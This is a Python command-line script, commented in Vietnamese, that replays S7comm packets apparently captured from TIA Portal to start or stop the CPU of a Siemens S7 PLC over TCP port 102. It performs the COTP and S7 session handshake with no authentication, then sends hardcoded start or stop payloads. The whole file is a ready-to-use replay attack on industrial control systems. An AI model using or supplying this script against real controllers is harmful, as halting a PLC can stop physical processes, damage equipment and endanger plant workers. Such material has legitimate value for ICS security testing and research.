#!/usr/bin/env python3
"""Replay Start/Stop CPU trên PLC S7 bằng payload S7comm đã capture từ TIA Portal."""

from __future__ import annotations

import socket
import sys

CPU_START = bytes.fromhex(
    "0300002502f0803201000005000014000028000000000000"
    "fd000009505f50524f4752414d"
)
CPU_STOP = bytes.fromhex(
    "0300002102f08032010000060000100000290000000000"
    "09505f50524f4752414d"
)

# Thử lần lượt đến khi nhận COTP Connection Confirm (0xD0).
COTP_CR_VARIANTS = [
    bytes.fromhex("0300001611e00000000100c0010ac1020100c2020101"),
    bytes.fromhex("0300001611e00000000f00c0010ac1020102c1020100"),
]
S7_SETUP = bytes.fromhex("0300001902f08032010000722f00080000f0000001000101e0")


def send_recv(sock: socket.socket, data: bytes) -> bytes:
    sock.send(data)
    return sock.recv(65535)


def setup_session(ip: str, port: int = 102, timeout: float = 5.0) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((ip, port))

    confirmed = False
    for cotp in COTP_CR_VARIANTS:
        resp = send_recv(sock, cotp)
        if len(resp) >= 6 and resp[5] == 0xD0:
            confirmed = True
            break
    if not confirmed:
        sock.close()
        raise ConnectionError("COTP Connection Confirm failed")

    setup = send_recv(sock, S7_SETUP)
    if len(setup) < 20 or setup.hex()[18:20] != "00":
        sock.close()
        raise ConnectionError("S7 Setup Communication failed")

    return sock


def replay(ip: str, action: str) -> None:
    payload = CPU_START if action == "start" else CPU_STOP
    sock = setup_session(ip)
    try:
        resp = send_recv(sock, payload)
    finally:
        sock.close()

    if len(resp) < 19:
        raise RuntimeError(f"No valid S7 Ack after {action}")

    err_class, err_code = resp[17], resp[18]
    if err_class != 0 or err_code != 0:
        raise RuntimeError(
            f"PLC rejected {action}: error class=0x{err_class:02x} code=0x{err_code:02x}"
        )

    print(f"[+] {action} OK")


def main() -> None:
    if len(sys.argv) != 3 or sys.argv[2] not in ("start", "stop"):
        print(f"Usage: {sys.argv[0]} <ip> <start|stop>", file=sys.stderr)
        sys.exit(1)

    try:
        replay(sys.argv[1], sys.argv[2])
    except (ConnectionError, RuntimeError, TimeoutError, OSError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(2)


if __name__ == "__main__":
    main()
